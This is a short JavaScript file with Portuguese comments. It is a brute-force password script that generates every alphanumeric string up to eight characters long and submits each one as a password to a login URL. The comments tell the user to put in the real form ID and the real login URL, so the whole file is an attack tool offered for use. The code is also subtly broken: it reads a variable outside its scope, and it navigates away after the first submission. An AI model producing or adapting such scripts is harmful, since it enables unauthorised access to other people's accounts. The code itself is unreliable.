document.addEventListener('DOMContentLoaded', () => {
  const form = document.getElementById('login-form'); // Substitua pelo ID do seu formulário
  form.addEventListener('submit', handleSubmit);
});

function handleSubmit(event) {
  //event.preventDefault(); // Impede o envio padrão do formulário

  const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.';
  const maxLength = 8;

  for (let len = 1; len <= maxLength; len++) {
    generateCombinations('', len);
  }
}

function generateCombinations(prefix, remainingLength) {
  if (remainingLength === 0) {
    submitForm(prefix);
    return;
  }

  for (const char of characters) {
    generateCombinations(prefix + char, remainingLength - 1);
  }
}

function submitForm(password) {
  const form = document.createElement('form');
  form.method = 'POST';
  form.action = 'https://example.com/login'; // Substitua pelo URL de login real
  const input = document.createElement('input');
  input.type = 'password';
  input.name = 'password';
  input.value = password;
  form.appendChild(input);
  document.body.appendChild(form);
  form.submit();
}